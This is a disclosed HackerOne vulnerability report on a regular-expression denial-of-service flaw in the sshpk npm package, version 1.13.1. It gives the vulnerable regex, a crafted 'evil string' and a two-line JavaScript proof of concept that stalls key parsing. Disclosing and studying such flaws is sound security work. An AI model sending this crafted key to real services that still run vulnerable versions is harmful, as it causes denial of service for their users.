---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '319593'
original_report_id: '319593'
title: '`sshpk` is vulnerable to ReDoS when parsing crafted invalid public keys'
weakness: Uncontrolled Resource Consumption
team_handle: nodejs-ecosystem
created_at: '2018-02-25T19:14:42.891Z'
disclosed_at: '2018-04-04T21:26:06.821Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 5
asset_identifier: sshpk
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- uncontrolled-resource-consumption
---

# `sshpk` is vulnerable to ReDoS when parsing crafted invalid public keys

## Metadata

- HackerOne Report ID: 319593
- Weakness: Uncontrolled Resource Consumption
- Program: nodejs-ecosystem
- Disclosed At: 2018-04-04T21:26:06.821Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report a ReDoS in `sshpk`
It allows to cause Denial of Service by trying to parse a crafted public key.

# Module

**module name:** sshpk
**version:** 1.13.1
**npm page:** `https://www.npmjs.com/package/sshpk`

## Module Description

> Parse, convert, fingerprint and use SSH keys (both public and private) in pure node -- no ssh-keygen or other external dependencies.

## Module Stats

320 485 downloads in the last day
4 709 033 downloads in the last week
19 365 516 downloads in the last month

~232 386 192 estimated downloads per year

# Vulnerability

## Vulnerability Description

ReDoS.

- regex: /^([a-z0-9-]+)[ \t]+([a-zA-Z0-9+\/]+[=]*)([\n \t]+([^\n]+))?$/
- evil string: `ssh-rsa a${Array(200000).join(' ')}x\nx` (~200 KB, unwrap js template string)
- file: https://github.com/joyent/node-sshpk/blob/v1.13.1/lib/formats/ssh.js#L17

The testcase uses ~200 KB string to demonstrate long unavailability period, but parsing is also considerably slow on shorter strings.

## Steps To Reproduce:

```js
var keyPub = `ssh-rsa a${Array(200000).join(' ')}x\nx`;
var key = require('sshpk').parseKey(keyPub, 'ssh');
```

## Supporting Material/References:

- Arch Linux Current
- Node.js 9.5.0
- npm 5.6.0

# Wrap up

- I contacted the maintainer to let him know: N 
- I opened an issue in the related repository: N

## Impact

Cause denial of service by parsing a crafted public key file.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
